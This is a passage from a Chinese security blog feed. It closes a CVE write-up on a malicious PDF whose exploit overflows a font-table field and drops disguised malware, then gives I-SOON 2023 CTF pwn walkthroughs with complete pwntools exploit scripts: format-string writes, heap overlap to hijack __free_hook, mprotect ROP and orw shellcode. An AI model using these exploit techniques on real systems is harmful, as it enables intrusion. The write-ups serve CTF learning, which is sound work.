&#125;&#125;</code></pre><p>之后我就不细讲了，这里涉及到的知识越来越难懂了，写了没什么意义，总的来说就是，svrhost.exe文件会在系统目录下生成其他病毒文件，同时篡改系统文件，然后他也会创建一系列bat批处理文件，要么是关闭服务，要么是删除自身以及病毒痕迹，或者说是加载恶意DLL，而该注入的恶意DLL文件就是msxml0r.dll文件.</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/1ad5ad6eddc451daea701121f3fd5266d1163271.jpg"></p><p>他经过PECompact加壳处理，他会得到3个URL地址然后不断发送HTTP请求，下载3个gif文件，可以猜测这三个gif文件中包含一些PE数据，用来执行恶意操作。最后我们的shellcode将会把PDF样本修改为正常文件，也就是删除了TTF字体的SING表。</p><p>可以看到PDF正常打开</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9825bc315c6034a8716aa54b8e1349540823766b.jpg"></p><p>整个恶意PDF文件如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939012efb90f43eec54e737d1967a.jpg"></p><h2 id="8-整体过程"><a href="#8-整体过程" class="headerlink" title="8.整体过程"></a>8.整体过程</h2><p>不得不说自身还是太菜了，在后面恶意代码分析阶段差的不是一点半点，但好歹也把漏洞利用这部分搞明白了，总体流程归结于如下几点：</p><ol><li>strcat函数可以通过SING表的uniqueName字段来进行栈溢出</li><li>通过覆盖栈上的函数指针而不是返回值，使得后续调用该指针来绕过GS，也就是canary，然后进行ROP</li><li>使用heap spray来布置大量相同的shellcode。堆喷的脚本使用随机变量名、\x25替代%号来、添加无用代码来绕过杀毒软件分析</li><li>通过ROP来绕过DEP保护，也就是NX</li><li>其中ROP的构造我们利用未开启ALSR的模块来获取gadget，他的地址一般是固定的</li><li>由于我们的uniqueName可能不能太大，防止覆盖程序关键数据，因此我们此时使用两次栈迁移来到我们精准堆喷的地址，0x0c0c0c0c，我们将漏洞利用程序使用文件映射的一些函数映射到内存，然后将EIP指向他。</li><li>然后我们通过PEB环境控制块来获取kernel32.dll的基地址，从而获取一些需要运行的函数地址</li><li>通过异或和交换字符来对恶意PE文件进行加密</li><li>释放并且运行svchost.exe恶意文件，文件名同系统进程名一致，增加隐蔽性</li><li>提升权限，关闭系统文件保护，用来修改系统文件</li><li>修改打印服务程序spoolsv.exe的导入表，使得其在启动的时候加载恶意dll程序</li><li>修改文件时间等加密隐蔽性，然后运行完程序后，会删除没用的程序防止被发现</li><li>利用加壳防止逆向分析</li><li>远程下载恶意程序，最后修改恶意样本PDF文件为正常PDF并打开，假装我们是正常开启。</li></ol><h2 id="9-漏洞修复"><a href="#9-漏洞修复" class="headerlink" title="9.漏洞修复"></a>9.漏洞修复</h2><p>官方在之后修补该漏洞的时候，添加了字符串长度的检测和限制，用新的函数来替代了strcat函数，这样就避免了我们在栈上构造虚假函数指针</p><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h2><p>不得不说自己掌握的知识还是太少，上面整体过程中步骤从1~6是漏洞利用步骤看着还挺顺利，之后的步骤是恶意代码行为，对于恶意文件分析感觉自己对windows了解的太少了，之后还是先复现linux的漏洞再来看windows把。不过由于这是本人第一次进行漏洞复现，所以对于恶意代码也尽量硬着头皮看了看，但是发现自身对于windows的了解还是太少，看到后面还是挺折磨的，因此我下一步准备还是复现Linux方面的了。</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I-SOON_2023</title>
    <link href="/2023/06/17/I-SOON-2023(pwn)/"/>
    <url>/2023/06/17/I-SOON-2023(pwn)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>赛时我唯唯诺诺，赛后我重拳出击！</p></blockquote><hr><h2 id="1-I-SOON-2023-harde-pwn"><a href="#1-I-SOON-2023-harde-pwn" class="headerlink" title="1. [I-SOON 2023]harde_pwn"></a>1. [I-SOON 2023]harde_pwn</h2><p>首先是检查题目情况</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/harde_pwn$ checksec pwn          [*] &#39;/home/dawn/Downloads/harde_pwn/pwn&#39;                                   Arch:     amd64-64-little                                              RELRO:    Full RELRO                                                   Stack:    No canary found                                              NX:       NX enabled                                                   PIE:      PIE enabled                                                  RUNPATH:  b&#39;../../tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/&#39;</code></pre><p>其中libc已经给出为2.35，第一反应是找IO利用链，但是这里我发现我自己是想太多了，如果题目给出栈情况，且版本较高，那就应该单利用栈就行了？何况还是pwn1。<br>虽说是pwn1但是还是没写出来，有个非栈上的格式化漏洞但就是不知道写哪儿。</p><p>首先分析反编译代码</p><pre><code class="hljs">_DWORD *fuxk_game()&#123;  _DWORD *result; // rax  char buf[28]; // [rsp+0h] [rbp-40h] BYREF  __int64 seed; // [rsp+1Ch] [rbp-24h]  int v3; // [rsp+24h] [rbp-1Ch] BYREF  int v4; // [rsp+28h] [rbp-18h]  int i; // [rsp+2Ch] [rbp-14h]  puts(&quot;Welcome to a ctype game!&quot;);  seed = randomm();  read(0, buf, 0x20uLL);  srand(seed);  for ( i = 0; i &lt;= 20; ++i )  &#123;    v4 = (rand() ^ 0x24) + 1;    puts(&quot;input: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v3);    if ( v4 != v3 )    &#123;      puts(&quot;fuxk up!&quot;);      exit(1);    &#125;    puts(&quot;Success!&quot;);  &#125;  result = &amp;is_fmt;  is_fmt = 1;  return result;&#125;</code></pre><p>这里发现首先得过一下上面这个game，可以知道seed是由<code>/dev/urandom</code>而来，所以无法使用ctypes，但是我们发现后面有个buf溢出，可以覆盖到seed，所以我们覆盖为0再写一个简单的c就可以得出连续20个随机数，但这里其实可以用ctypes库了。</p><p>过了上面的函数之后就会有一个堆上的格式化字符串</p><pre><code class="hljs">void __noreturn heap_fmt()&#123;  char *ptr; // [rsp+8h] [rbp-8h]  for ( ptr = 0LL; ; printf(ptr) )  &#123;    ptr = (char *)realloc(ptr, 0x1000uLL);    my_write(&quot;input your data ;)\n&quot;);    read(0, ptr, 0x1000uLL);  &#125;&#125;</code></pre><p>这里我们发现无法跳出函数，且结束不了主函数，因此无法来通过格式化字符串来写返回值，比赛中我甚至想在栈上写一个堆地址，然后每次修改ptr值为0，导致realloc每次新分配一个0x1000的大块，最终打爆topchunk，再触发一下<code>malloc_assert</code>来使用house of cat,但最终还是没有实现。之后看师傅们的wp发现自己想太多了</p><p>得出结论在比赛中重要的还是<strong>调试</strong></p><p>回到题目中，既然无法达到调用printf的函数ret，那就修改printf的返回值就行，如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────                         0x7f51addb181a &lt;printf+170&gt;     call   0x7f51addc60b0                &lt;0x7f51addc60b0&gt;                                                                                                                         0x7f51addb181f &lt;printf+175&gt;     mov    rdx, qword ptr [rsp + 0x18]                                     0x7f51addb1824 &lt;printf+180&gt;     sub    rdx, qword ptr fs:[0x28]                                        0x7f51addb182d &lt;printf+189&gt;     jne    printf+199                &lt;printf+199&gt;                                                                                                                                 0x7f51addb182f &lt;printf+191&gt;     add    rsp, 0xd8                                                     ► 0x7f51addb1836 &lt;printf+198&gt;     ret                                  &lt;0x556c83a69500; heap_fmt+92&gt;      ↓                                                                                                     0x556c83a69500 &lt;heap_fmt+92&gt;    jmp    heap_fmt+20                &lt;heap_fmt+20&gt;                         ↓                                                                                                     0x556c83a694b8 &lt;heap_fmt+20&gt;    mov    rax, qword ptr [rbp - 8]                                        0x556c83a694bc &lt;heap_fmt+24&gt;    mov    esi, 0x1000                                                     0x556c83a694c1 &lt;heap_fmt+29&gt;    mov    rdi, rax                                                        0x556c83a694c4 &lt;heap_fmt+32&gt;    call   realloc@plt                &lt;realloc@plt&gt;                     ────────────────────────────────────[ STACK ]────────────────────────────────────                      00:0000│ rsp 0x7ffe1c865e48 —▸ 0x556c83a69500 (heap_fmt+92) ◂— jmp    0x556c83a694b8                   01:0008│     0x7ffe1c865e50 ◂— 0x0                                                                     02:0010│     0x7ffe1c865e58 —▸ 0x556c845532a0 ◂— &#39;%24160c%15$hn&#39;                                       03:0018│ rbp 0x7ffe1c865e60 —▸ 0x7ffe1c865e70 ◂— 0x1                                                   04:0020│     0x7ffe1c865e68 —▸ 0x556c83a69543 (main+65) ◂— mov    eax, 0                               05:0028│     0x7ffe1c865e70 ◂— 0x1                                                                     06:0030│     0x7ffe1c865e78 —▸ 0x7f51add7ad90 ◂— mov    edi, eax                                       07:0038│     0x7ffe1c865e80 ◂— 0x0                                                                     </code></pre><p>可以看到这里printf准备返回了已经，此时rsp上面就写着返回的地址，并且此时这里我们并没有动到rbp，所以我们可以写rsp的值为我们的一个特殊的指令，比如说就是我们的某个指令，然后再跟下面rbp进行配合即可，因此我们选用ret2rcu上的一段指令，</p><pre><code class="hljs">pwndbg&gt; x/20i 0x5582df56d5b0                           0x5582df56d5b0 &lt;__libc_csu_init+96&gt;: pop    r14     0x5582df56d5b2 &lt;__libc_csu_init+98&gt;: pop    r15     0x5582df56d5b4 &lt;__libc_csu_init+100&gt;:        ret </code></pre><p>我们看到这里的指令真是妙到极点，我们通过ret到该指令这里，然后连续pop两个值，再调用ret就会弹出我们rbp的值，然后就可以执行我们写入rbp的one_gadget了，情况如下：</p><pre><code class="hljs">──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────                                           0x7f02c954b81a &lt;printf+170&gt;             call   0x7f02c95600b0                &lt;0x7f02c95600b0&gt;                                                                                                                                                   0x7f02c954b81f &lt;printf+175&gt;             mov    rdx, qword ptr [rsp + 0x18]                                              0x7f02c954b824 &lt;printf+180&gt;             sub    rdx, qword ptr fs:[0x28]                                                 0x7f02c954b82d &lt;printf+189&gt;             jne    printf+199                &lt;printf+199&gt;                                                                                                                                                           0x7f02c954b82f &lt;printf+191&gt;             add    rsp, 0xd8                                                              ► 0x7f02c954b836 &lt;printf+198&gt;             ret                                  &lt;0x55711d89d5b0; __libc_csu_init+96&gt;        ↓                                                                                                                      0x55711d89d5b0 &lt;__libc_csu_init+96&gt;     pop    r14                                                                      0x55711d89d5b2 &lt;__libc_csu_init+98&gt;     pop    r15                                                                      0x55711d89d5b4 &lt;__libc_csu_init+100&gt;    ret                                                                              ↓                                                                                                                      0x7f02c95d6cf5 &lt;execvpe+1141&gt;           mov    rsi, r10                                                                 0x7f02c95d6cf8 &lt;execvpe+1144&gt;           lea    rdi, [rip + 0xec999]                                                  ───────────────────────────────────[ STACK ]────────────────────────────────────                                        00:0000│ rsp 0x7ffcfb0d93c8 —▸ 0x55711d89d5b0 (__libc_csu_init+96) ◂— pop    r14                                        01:0008│     0x7ffcfb0d93d0 ◂— 0x0                                                                                      02:0010│     0x7ffcfb0d93d8 —▸ 0x55711ed972a0 ◂— &#39;%176c%45$hhn&#39;                                                         03:0018│ rbp 0x7ffcfb0d93e0 —▸ 0x7f02c95d6cf5 (execvpe+1141) ◂— mov    rsi, r10                                         04:0020│     0x7ffcfb0d93e8 —▸ 0x55711d89d543 (main+65) ◂— mov    eax, 0                                                05:0028│     0x7ffcfb0d93f0 ◂— 0x1                                                                                      06:0030│     0x7ffcfb0d93f8 —▸ 0x7f02c9514d90 ◂— mov    edi, eax                                                        07:0038│     0x7ffcfb0d9400 ◂— 0x0                                                                                      </code></pre><p>至于任意地址写，是我们通过栈上存在的一个<code>栈地址-&gt;栈地址-&gt;栈地址</code>链条来达成，具体手法可以自行搜索<br>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))sa(&quot;game!\n&quot;, b&#39;\x00&#39;*32)sla(&quot;input: \n&quot;, str(0x6b8b4544))sla(&quot;input: \n&quot;, str(0x327b23e3))sla(&quot;input: \n&quot;, str(0x643c984e))sla(&quot;input: \n&quot;, str(0x66334858))sla(&quot;input: \n&quot;, str(0x74b0dc76))sla(&quot;input: \n&quot;, str(0x19495cdc))sla(&quot;input: \n&quot;, str(0x2ae8946f))sla(&quot;input: \n&quot;, str(0x625558c9))sla(&quot;input: \n&quot;, str(0x238e1f0e))sla(&quot;input: \n&quot;, str(0x46e87cea))sla(&quot;input: \n&quot;, str(0x3d1b589f))sla(&quot;input: \n&quot;, str(0x507ed790))sla(&quot;input: \n&quot;, str(0x2eb141d7))sla(&quot;input: \n&quot;, str(0x41b71ee0))sla(&quot;input: \n&quot;, str(0x79e2a9c8))sla(&quot;input: \n&quot;, str(0x7545e163))sla(&quot;input: \n&quot;, str(0x515f0059))sla(&quot;input: \n&quot;, str(0x5bd062e7))sla(&quot;input: \n&quot;, str(0x12200871))sla(&quot;input: \n&quot;, str(0x4db127dd))sla(&quot;input: \n&quot;, str(0x2162340))elf = ELF(&#39;./pwn&#39;)libc = ELF(&#39;./libc.so.6&#39;)sla(&quot;data ;)\n&quot;, b&#39;%11$p%9$p%8$p&#39;)ru(&#39;0x&#39;)libc_base = int(rc(12), 16) - 0x29d90ru(&#39;0x&#39;)pro_base = int(rc(12), 16) - 0x1543ru(&#39;0x&#39;)stack_addr = int(rc(12), 16) - 0x28slog(&quot;stack_addr&quot;, stack_addr)slog(&quot;libc_base&quot;, libc_base)slog(&quot;pro_base&quot;, pro_base)stack_low2 = int(stack_addr%0x10000)print(stack_low2)rbp = stack_addr + 0x18rbp_low2 = int(rbp%0x10000)#change the rbpone_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]shell = libc_base + one_gadget[2]shell_low2 = shell%0x10000shell_mid2 = int(shell/0x10000)%0x10000shell_high2 = int(shell/0x100000000)slog(&quot;shell&quot;, shell)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_low2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 2) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_mid2) + &#39;c%45$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(rbp_low2 + 4) + &#39;c%15$hn\x00&#39;)sla(&quot;data ;)\n&quot;, &#39;%&#39;+str(shell_high2) + &#39;c%45$hn\x00&#39;)#change the retsla(&quot;data ;)\n&quot;, &#39;%&#39;+str(stack_low2) + &#39;c%15$hn\x00&#39;)debug()sla(&quot;data ;)\n&quot;, &#39;%176c%45$hhn\x00&#39;)io.interactive()</code></pre><h2 id="2-I-SOON-2023-pwnpwn"><a href="#2-I-SOON-2023-pwnpwn" class="headerlink" title="2. [I-SOON 2023]pwnpwn"></a>2. [I-SOON 2023]pwnpwn</h2><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwnpwn$ checksec pwn[*] &#39;/home/dawn/Downloads/pwnpwn/pwn&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>题目环境2.31,保护全开<br>本题十分的可惜，应该是可以出的，感觉是pwn1一直没想到所以心态有点问题，导致本题看的时候居然off by null没看到，这也说明了比赛中心境也是一个重要点，本题十分常规，最开始ida会有一些混淆，例如：</p><pre><code class="hljs">  sub_B20();  puts(&quot;Welcome to An Xun Cup, this is an menu&quot;);  check();  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;choice);    switch ( choice )    &#123;      case 1:        add();        break;      case 2:        if ( dword_203024 &lt; 10 || (((dword_203098 - 1) * dword_203098) &amp; 1) == 0 )          goto LABEL_5;        do        &#123;          show();LABEL_5:          show();        &#125;        while ( dword_203024 &gt;= 10 &amp;&amp; (((dword_203098 - 1) * dword_203098) &amp; 1) != 0 );        break;</code></pre><p>慢慢逆会发现这些语句就是一些重复的，不用管他们，整个题首先需要ctypes进行模拟，出几个随机数的个位来猜组合的千位数，然后这里面show和edit&#x2F;delete功能不能同时使用，需要运行权限切换的一个函数来切换状态，其他就十分常规，add函数里面由off by null（我朝，太sb了我）。</p><p>然后之后就是制造重叠堆块，向上合并，这里记住恢复一下堆块们的布局，之后就是重叠堆块中写以释放堆块tcachebins的fd指针了，很常规，写free hook，</p><p>exp如下：</p><pre><code class="hljs">from pwn import *from LibcSearcher import *from ctypes import *context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;)context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;node4.anna.nssctf.cn&#39;,28151)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;34m[+]\033[40;35m&quot; + name + &quot;==&gt;&quot; +hex(address) + &quot;\033[0m&quot;)def debug():    gdb.attach(io)    def get_address(): return u64(ru(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(index, size, content):    sla(&quot;root@$\n&quot;, str(1))    sla(&quot;index:\n&quot;, str(index))    sla(&quot;size:\n&quot;, str(size))    sa(&quot;content:\n&quot;, content)def show(index):    sla(&quot;root@$\n&quot;, str(2))    sla(&quot;index:\n&quot;, str(index))def edit(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def edit_0(index, content):    sla(&quot;root@$\n&quot;, str(3))    sla(&quot;index\n&quot;, str(index))    sa(&quot;content:\n&quot;, content)def delete(index):    sla(&quot;root@$\n&quot;, str(4))    sla(&quot;index:\n&quot;, str(index))def login(passwd):    sla(&quot;root@$\n&quot;, str(5))    sla(&quot;username\n&quot;, &#39;fang&#39;)    sla(&quot;passwd\n&quot;, passwd) LIBC = cdll.LoadLibrary(&#39;./libc-2.31.so&#39;)LIBC.srand(LIBC.time(0))libc = ELF(&#39;./libc-2.31.so&#39;)qian = LIBC.rand()%10bai = LIBC.rand()%10shi = LIBC.rand()%10ge = LIBC.rand()%10num = qian*1000 + bai*100 + shi*10 + gesla(&quot;number:&quot;, str(num))add(0, 0x410,  b&#39;aaaaa&#39;)add(1, 0x20, b&#39;ccc&#39;)login(&#39;abcd&#39;)   # show-&gt;edits(&#39;\n&#39;)edit(0, b&#39;cbdfasaf&#39;)delete(0)add(0, 0x410, b&#39;a&#39;*7)edit(0, b&#39;a&#39;*8)debug()login(&#39;a&#39;*8)   # edit-&gt;showshow(0)libc_base = get_address() - 0x1ecbe0slog(&quot;libc_base&quot;, libc_base)malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]slog(&quot;__malloc_hook&quot;, malloc_hook)free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]slog(&quot;__free_hook&quot;, free_hook)system = libc_base + libc.sym[&#39;system&#39;]# leak the heaplogin(b&#39;a&#39;*3 + b&#39;\x00&#39;) #show-&gt;editadd(2, 0x20, b&#39;fdasf&#39;)add(3, 0x4f0, b&#39;aaaa&#39;)add(4, 0x10, b&#39;aaaa&#39;)add(5, 0x20, b&#39;aaaa&#39;)delete(0)add(6, 0x500, b&#39;cccc&#39;)add(0, 0x410, b&#39;aaaa&#39;)edit(0, b&#39;a&#39;*0xf + b&#39;c&#39;) login(b&#39;a&#39;*8) #edit-&gt;showshow(0)ru(&#39;ac&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;heap_base&quot;, heap_base)login(b&#39;aaa\x00&#39;)delete(2)add(2, 0x28, p64(heap_base + 0x6c0) + b&#39;a&#39;*0x18 + p64(0x50))delete(1)add(1, 0x20, p64(0)+p64(0x51) + p64(heap_base + 0x6f0 - 0x18) + p64(heap_base + 0x6f0 - 0x10))   #pass the unlink checkdelete(3)       #overlap backwardadd(3, 0x100, p64(0)*3 + p64(0x31))    #resolve the heapdelete(5)delete(2)delete(3)add(3, 0x100, p64(0)*3 + p64(0x31) + p64(free_hook))add(2, 0x20, b&#39;ccc&#39;)add(5, 0x20, p64(system))add(7, 0x20, b&#39;/bin/sh\x00&#39;)delete(7)io.interactive()</code></pre><h2 id="3-I-SOON-2023-DE-CAT"><a href="#3-I-SOON-2023-DE-CAT" class="headerlink" title="3.[I-SOON 2023] DE-CAT"></a>3.[I-SOON 2023] DE-CAT</h2><p>照常检查，</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ checksec pwn [*] &#39;/home/dawn/Downloads/pwn/toCTFer/pwn&#39;                          Arch:     amd64-64-little                                       RELRO:    Full RELRO                                            Stack:    Canary found                                          NX:       NX enabled                                            PIE:      PIE enabled                                           RUNPATH:  b&#39;./&#39;                                             </code></pre><p>保护全开以及版本为2.35</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/toCTFer$ seccomp-tools dump ./pwn  line  CODE  JT   JF      K                                                 =================================                                            0000: 0x20 0x00 0x00 0x00000004  A = arch                                   0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004            0002: 0x20 0x00 0x00 0x00000000  A = sys_number                             0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                 0004: 0x06 0x00 0x00 0x00000000  return KILL                                0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                              </code></pre><p>存在沙盒，禁止了execve，所以基本上可以确定使用orw</p><p>题目的漏洞为edit函数当中的off by null</p><pre><code class="hljs">  result = (*(&amp;chunk_list + v1) + read(0, *(&amp;chunk_list + v1), size_list[v1]));  *result = 0;</code></pre><p>因此本题依然是采用overlapp来解题，首先是制造重叠堆块，然后修改tcache，这里因为我们需要多次分配奇奇怪怪的堆块，所以我们先控制tcache struct的0x290堆块来任意分配堆块。</p><p>控制了tcache struct后我们就可以通过environ来获取栈地址，然后我们修改add的ret地址来制造ROP，这里我们调用mprotect函数来将我们的栈地址增加一个执行权限，然后再到上面布置shellcode即可orw</p><p>exp如下：</p><pre><code class="hljs">from pwn import * from LibcSearcher import* context(arch = &#39;amd64&#39;, os = &#39;linux&#39;, log_level = &#39;debug&#39;) context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]io = process(&#39;./pwn&#39;)#io = remote(&#39;59.110.164.72&#39;, 10066) #io = remote(&quot;node4.buuoj.cn&quot;, 26610)s   = lambda content : io.send(content)sl  = lambda content : io.sendline(content)sa  = lambda content,send : io.sendafter(content, send)sla = lambda content,send : io.sendlineafter(content, send)rc  = lambda number : io.recv(number)ru  = lambda content : io.recvuntil(content)def slog(name, address): print(&quot;\033[40;31m[+]\033[40;35m&quot;+ name + &quot;==&gt;&quot; + hex(address) + &quot;\033[0m&quot;)def debug(): gdb.attach(io)def get_address(): return u64(ru(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def add(size, content):    #0x2d    sla(b&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    sla(b&quot;size:\n&quot;,str(size))    sa(b&#39;content:\n&#39;, content)def delete(index):    sla(b&#39;&gt;&gt; \n&#39;, &#39;2&#39;)    sla(&quot;idx:\n&quot;, str(index))def show(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;3&#39;)    sla(b&#39;idx:\n&#39;, str(index))def edit(index, content):    sla(b&quot;&gt;&gt; \n&quot;, &#39;4&#39;)    sla(b&#39;idx:\n&#39;, str(index))    sa(b&#39;content:\n&#39;, content)def kill(index):    sla(b&quot;&gt;&gt; \n&quot;, &#39;5&#39;)    sla(b&#39;---&gt;\n&#39;, str(index))add(0x4f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39;aaaa&#39;)  #1delete(0)add(0x5f8, b&#39;aaaa&#39;) #0add(0x4f8, b&#39; &#39;) #2show(2)ru(&#39;\x00\x00&#39;)libc_base = get_address()- 0x21a110ru(&#39;\x00\x00&#39;)heap_base = u64(rc(6).ljust(8, b&#39;\x00&#39;)) - 0x290slog(&quot;libc_base&quot;, libc_base)slog(&quot;heap_base&quot;, heap_base)edit(2, flat(&#123;0x0:heap_base + 0x290, 0x8:heap_base + 0x290, 0x4f0:0x500&#125;, filler = b&#39;\x00&#39;, length = 0x4f8))libc = ELF(&#39;./libc.so.6&#39;)mprotect = libc_base + libc.sym[&#39;mprotect&#39;]slog(&quot;mprotect&quot;, mprotect)delete(1) #overlap backwardadd(0x288, b&#39;aa&#39;) #1add(0x288, b&#39;a&#39;) #3delete(3)delete(2)edit(1, p64(((heap_base + 0x2a0)&gt;&gt;12)^(heap_base + 0x10))) #alloc the tcache structadd(0x288, b&#39;aa&#39;) #2add(0x288, flat(&#123;0x30:0x1, 0x140:libc_base + 0x221200 - 0x10&#125;, filler = b&#39;\x00&#39;, length = 0x288)) #3 , environadd(0x198, b&#39;a&#39;*0x10) #4show(4)stack_addr = get_address()slog(&quot;stack&quot;, stack_addr)debug()add_ret = stack_addr - 0x140pop_rdi = libc_base + 0x000000000002a3e5pop_rsi = libc_base + 0x000000000002be51pop_rdx_r12 = libc_base + 0x000000000011f497jmp_rsp = libc_base + 0x8821dedit(3, flat(&#123;0x30:0x1, 0x140:add_ret - 0x8&#125;, filler = b&#39;\x00&#39;))slog(&quot;add_ret&quot;, add_ret)payload = p64(0) + p64(pop_rdi) + p64(stack_addr&amp;(~0xfff)) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_r12) + p64(7)*2 + p64(mprotect)payload += p64(jmp_rsp)shellcode = shellcraft.open(&#39;./flag&#39;, 0)shellcode += shellcraft.read(&#39;rax&#39;, heap_base + 0xca0, 0x30)shellcode += shellcraft.write(1, heap_base + 0xca0, 0x30)shellcode = asm(shellcode)payload += shellcode + b&#39;aaaa&#39;add(0x198, payload)io.interactive()</code></pre><h2 id="4-I-SOON-2023-computer"><a href="#4-I-SOON-2023-computer" class="headerlink" title="4.[I-SOON 2023]computer"></a>4.[I-SOON 2023]computer</h2><p>本题突一个字“逆”，题目中冗杂的数据结构以及分配手法令人眼花缭乱。此时仅需要一颗平静的心态和良好的环境（以及星盟的wp呜呜呜）。</p><p>据说computer团长一个半小时就出了，tql。</p><p>先检查一下，不过多半也是全开</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ checksec computer        [*] &#39;/home/dawn/Downloads/pwn/computer/computer&#39;                                 Arch:     amd64-64-little                                                    RELRO:    Full RELRO                                                         Stack:    Canary found                                                       NX:       NX enabled                                                         PIE:      PIE enabled                                                        RUNPATH:  b&#39;../../../tools/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/&#39; </code></pre><p>其中也存在沙盒，因此是采用orw</p><pre><code class="hljs">dawn@dawn-virtual-machine:~/Downloads/pwn/computer$ seccomp-tools dump ./computer     line  CODE  JT   JF      K                                                          =================================                                                     0000: 0x20 0x00 0x00 0x00000004  A = arch                                            0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004                     0002: 0x20 0x00 0x00 0x00000000  A = sys_number                                      0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005                          0004: 0x06 0x00 0x00 0x00030000  return TRAP                                         0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW                                       </code></pre><p>然后就是本题最为关键的逆向环节</p><pre><code class="hljs">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char s[2568]; // [rsp+10h] [rbp-A10h] BYREF  unsigned __int64 v4; // [rsp+A18h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_3E2C();  root_dir = create(&quot;/&quot;, 1, 0LL, 7);            // 创建文件夹  root_ptr = root_dir;  HRP = create(&quot;HRP&quot;, 0, 0LL, 7);               // 创建文件  linkfile(root_dir, HRP);                      // /HRP  mkflag(root_dir);  while ( 1 )  &#123;    printf(&quot;&gt; &quot;);    fgets(s, 2560, stdin);    s[strcspn(s, &quot;\n&quot;)] = 0;    menu(&amp;root_ptr, s, root_dir, HRP);    fflush(stdin);  &#125;&#125;</code></pre><p>其中create函数可以得知他可以根据所给参数判断是创建文件或文件夹，文件的部分大致如下：</p><pre><code class="hljs">|文件名指针|         ||文件内容指针|上级文档| |文件类型  |下一个文件 ||文件大小  |          |</code></pre><p>这里最难绷的是ida本身可能会出现点反编译的错误，所以我们需要在给数据结构赋值过程中查看汇编语言来帮助我们逆向，在其中会出现malloc的情况，除此之外我们还需要注意到strdup这个函数。</p><p>strdup这个函数是一个复制函数，他会在内部malloc一定空间，然后复制参数到其中，最后将该空间作为返回值传递，因此他也经常与free函数一起出现，但是这里我们发现并没有。</p><p>然后函数就是让我们不断传递控制命令，其中有漏洞的地方就是kill命令有一个uaf，如下：</p><pre><code class="hljs">  else if ( !strcmp(command_0, &quot;kill&quot;) )  &#123;    v12 = atoi(command_1);    if ( v12 &gt;= 0 &amp;&amp; v12 &lt;= exec_num )    &#123;      free(*(*(&amp;process + v12) + 8LL));      free(*(&amp;process + v12));      